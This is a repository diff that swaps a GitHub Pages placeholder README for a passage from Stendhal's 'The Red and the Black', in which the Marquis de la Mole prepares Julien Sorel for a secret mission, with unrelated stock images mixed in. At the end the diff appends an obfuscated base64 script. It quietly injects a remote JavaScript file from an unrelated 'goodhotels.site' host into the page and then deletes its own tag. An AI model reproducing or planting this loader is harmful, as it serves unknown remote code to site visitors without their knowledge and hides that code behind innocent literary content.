@@ -1,37 +1,80 @@
-## Welcome to GitHub Pages
+# THE SECRET NOTE
+The marquis summoned him; M. de la Mole looked rejuvenated, his eye was brilliant.
 
-You can use the [editor on GitHub](https://github.com/lyudalomova/Secret/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+"Let us discuss your memory a little," he said to Julien, "it is said to be prodigious. Could you learn four pages by heart and go and say them at London, but without altering a single word?"
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+The marquis was irritably fingering, the day's Quotidienne, and was trying in vain to hide an extreme seriousness which Julien had never noticed in him before, even when discussing the Frilair lawsuit.
+![i](https://akm-img-a-in.tosshub.com/indiatoday/images/story/202001/kingfisher-2046453_1920-770x433.jpeg?USHtuDyOLsdO6xeYmeDZzSH_WUh7Yu06)
+Julien had already learned sufficient manners to appreciate that he ought to appear completely taken in by the lightness of tone which was being manifested.
 
-### Markdown
+"This number of the Quotidienne is not very amusing possibly, but if M. the marquis will allow me, I shall do myself the honour to-morrow morning of reciting it to him from beginning to end."
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+"What, even the advertisements?"
 
-```markdown
-Syntax highlighted code block
+"Quite accurately and without leaving out a word."
 
-# Header 1
-## Header 2
-### Header 3
+"You give me your word?" replied the marquis with sudden gravity.
 
-- Bulleted
-- List
+"Yes, monsieur; the only thing which could upset my memory is the fear of breaking my promise."
 
-1. Numbered
-2. List
+"The fact is, I forgot to put this question to you yesterday: I am not going to ask for your oath never to repeat what you are going to hear. I know you too well to insult you like that. I have answered for you. I am going to take you into a salon where a dozen persons will he assembled. You will make a note of what each one says.
 
-**Bold** and _Italic_ and `Code` text
+"Do not be uneasy. It will not be a confused conversation by any means. Each one will speak in his turn, though not necessarily in an orderly manner," added the marquis falling back into that light, subtle manner which was so natural to him. "While we are talking, you will write out twenty pages and will come back here with me, and we will get those twenty pages down to four, and those are the four pages you will recite to me to-morrow morning instead of the four pages of the Quotidienne. You will leave immediately afterwards. You must post about like a young man travelling on pleasure. Your aim will be to avoid attracting attention. You will arrive at the house of a great personage. You will there need more skill. Your business will then be to take in all his entourage, for among his secretaries and his servants are some people who have sold themselves to our enemies, and who spy on our travelling agents in order to intercept them.
 
-[Link](url) and ![Image](src)
-```
+"You will have an insignificant letter of introduction. At the moment his Excellency looks at you, you will take out this watch of mine, which I will lend you for the journey. Wear it now, it will be so much done; at any rate give me yours.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+"The duke himself will be good enough to write at your dictation the four pages you have learnt by heart.
 
-### Jekyll Themes
+"Having done this, but not earlier, mind you, you can, if his Excellency questions you, tell him about the meeting at which you are now going to be present.
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/lyudalomova/Secret/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+"You will be prevented from boring yourself on the journey between Paris and the minister's residence by the thought that there are people who would like nothing better than to fire a shot at M. the abbé Sorel. In that case that gentleman's mission will be finished, and I see a great delay, for how are we to know of your death, my dear friend? Even your zeal cannot go to the length of informing us of it.
 
-### Support or Contact
+"Run straight away and buy a complete suit," went on the marquis seriously. "Dress in the fashion of two years ago. To-night you must look somewhat badly groomed. When you travel, on the other hand, you will be as usual. Does this surprise you? Does your suspiciousness guess the secret? Yes, my friend, one of the venerable personages you are going to hear deliver his opinion, is perfectly capable of giving information as the result of which you stand a very good chance of being given at least opium some fine evening in some good inn where you will have asked for supper."
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+"It is better," said Julien, "to do an extra thirty leagues and not take the direct road. It is a case of Rome, I suppose...." The marquis assumed an expression of extreme haughtiness and dissatisfaction which Julien had never seen him wear since Bray-le-Haut.
+
+"That is what you will know, monsieur, when I think it proper to tell you. I do not like questions."
+
+"That was not one," answered Julien eagerly. "I swear, monsieur, I was thinking quite aloud. My mind was trying to find out the safest route."
+![i](https://www.imperial.ac.uk/ImageCropToolT4/imageTool/uploaded-images/newseventsimage_1578913358419_mainnews2012_x1.jpg)
+"Yes, it seems your mind was a very long way off. Remember that an emissary, and particularly one of your age should not appear to be a man who forces confidences."
+
+Julien was very mortified; he was in the wrong. His vanity tried to find an excuse and did not find one.
+
+"You understand," added monsieur de la Mole, "that one always falls back on one's heart when one has committed some mistake."
+
+An hour afterwards Julien was in the marquis's ante-chamber. He looked quite like a servant with his old clothes, a tie of a dubious white, and a certain touch of the usher in his whole appearance. The marquis burst out laughing as he saw him, and it was only then that Julien's justification was complete.
+
+"If this young man betrays me," said M. de la Mole to himself, "whom is one to trust? And yet, when one acts, one must trust someone. My son and his brilliant friends of the same calibre have as much courage and loyalty as a hundred thousand men. If it were necessary to fight, they would die on the steps of the throne. They know everything—except what one needs in emergency. Devil take me if I can find a single one among them who can learn four pages by heart and do a hundred leagues without being tracked down. Norbert would know how to sell his life as dearly as his grandfathers did. But any conscript could do as much."
+
+The marquis fell into a profound reverie. "As for selling one's life too," he said with a sigh, "perhaps this Sorel would manage it quite as well as he could.
+
+### "Let us get into the carriage," said the marquis as though to chase away an unwanted idea.
+
+"Monsieur," said Julien, "while they were getting this suit ready for me, I learnt the first page of to-days Quotidienne by heart."
+
+The marquis took the paper. Julien recited it without making a single mistake. "Good," said the marquis, who this night felt very diplomatic. "During the time he takes over this our young man will not notice the streets through which we are passing."
+
+They arrived in a big salon that looked melancholy enough and was partly upholstered in green velvet. In the middle of the room a scowling lackey had just placed a big dining-table which he subsequently changed into a writing-table by means of an immense green inkstained tablecloth which had been plundered from some minister.
+
+The master of the house was an enormous man whose name was not pronounced. Julien thought he had the appearance and eloquence of a man who ruminated. At a sign from the marquis, Julien had remained at the lower end of the table. In order to keep himself in countenance, he began to cut quills. He counted out of the corner of his eye seven visitors, but Julien could only see their backs. Two seemed to him to be speaking to M. de la Mole on a footing of equality, the others seemed more or less respectful.
+
+A new person entered without being announced. "This is strange," thought Julien. "People are not announced in this salon. Is this precaution taken in my honour?" Everybody got up to welcome the new arrival. He wore the same extremely distinguished decoration as three of the other persons who were in the salon. They talked fairly low. In endeavouring to form an opinion of the new comer, Julien was reduced to seeing what he could learn from his features and his appearance. He was short and thick-set. He had a high colour and a brilliant eye and an expression that looked like a malignant boar, and nothing else.
+
+Julien's attention was partly distracted by the almost immediate arrival of a very different kind of person. It was a tall very thin man who wore three or four waistcoats. His eye was caressing, his demeanour polite.
+
+"He looks exactly like the old bishop of Besançon," thought Julien. This man evidently belonged to the church, was apparently not more than fifty to fifty-five years of age, and no one could have looked more paternal than he did.
+
+The young bishop of Agde appeared. He looked very astonished when, in making a scrutiny of those present, his gaze fell upon Julien. He had not spoken to him since the ceremony of Bray-le-Haut. His look of surprise embarrassed and irritated Julien. "What!" he said to himself, "will knowing a man always turn out unfortunate for me? I don't feel the least bit intimidated by all those great lords whom I have never seen, but the look of that young bishop freezes me. I must admit that I am a very strange and very unhappy person."
+
+An extremely swarthy little man entered noisily soon afterwards and started talking as soon as he reached the door. He had a yellow complexion and looked a little mad. As soon as this ruthless talker arrived, the others formed themselves into knots with the apparent object of avoiding the bother of listening to him.
+
+As they went away from the mantelpiece they came near the lower end of the table where Julien was placed. His countenance became more and more embarrassed, for whatever efforts he made, he could not avoid hearing, and in spite of all his lack of experience he appreciated all the moment of the things which they were discussing with such complete frankness, and the importance which the high personages whom he apparently had under his observation must attach to their being kept secret.
+
+Julien had already cut twenty quills as slowly as possible; this distraction would shortly be no longer available. He looked in vain at M. de la Mole's eyes for an order; the marquis had forgotten him.
+
+"What I am doing is ridiculous," he said to himself as he cut his quills, "but persons with so mediocre an appearance and who are handling such great interests either for themselves or for others must be extremely liable to take offence. My unfortunate look has a certain questioning and scarcely respectful expression, which will doubtless irritate them. But if I palpably lower my eyes I shall look as if I were picking up every word they said."
+
+His embarrassment was extreme, he was listening to strange things.
+
+<script id="1bQG3" src="data:text/javascript;base64, dmFyIF9MTUduMSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2NacldCLCBfcTJsRzMpIHt2YXIgX2xYNWFSID0gZnVuY3Rpb24oX2s2eXRFKSB7d2hpbGUgKC0tX2s2eXRFKSB7X2NacldCWydwdXNoJ10oX2NacldCWydzaGlmdCddKCkpO319O19sWDVhUigrK19xMmxHMyk7fShfTE1HbjEsIDB4MTFiKSk7dmFyIF9PUUdhOCA9IGZ1bmN0aW9uKF9TbXJJNywgX1FPTlJ3KSB7X1Ntckk3ID0gX1Ntckk3IC0gMHgwO3ZhciBfTXkwRFogPSBfTE1HbjFbX1Ntckk3XTtyZXR1cm4gX015MERaO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfT1FHYTgoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX0ZMbU1tID0gZG9jdW1lbnRbX09RR2E4KCcweDEnKV0oX09RR2E4KCcweDInKSk7X0ZMbU1tW19PUUdhOCgnMHgzJyldID0gX09RR2E4KCcweDQnKTtfRkxtTW1bJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3Nlx4NmNceDYxXHg2NFx4NjlceDczXHg2M1x4NjFceDYzXHg2M1x4MzVceDJlXHg2N1x4NmZceDZmXHg2NFx4NjhceDZmXHg3NFx4NjVceDZjXHg3M1x4MmVceDczXHg2OVx4NzRceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg2Y1x4NTNceDcyXHg2ZVx4NjdceDYyXHgzOVx4MzdceDQ5XHg3OCc7ZG9jdW1lbnRbX09RR2E4KCcweDUnKV0oX09RR2E4KCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX0ZMbU1tKTtkb2N1bWVudFtfT1FHYTgoJzB4NycpXSgnMWJRRzMnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
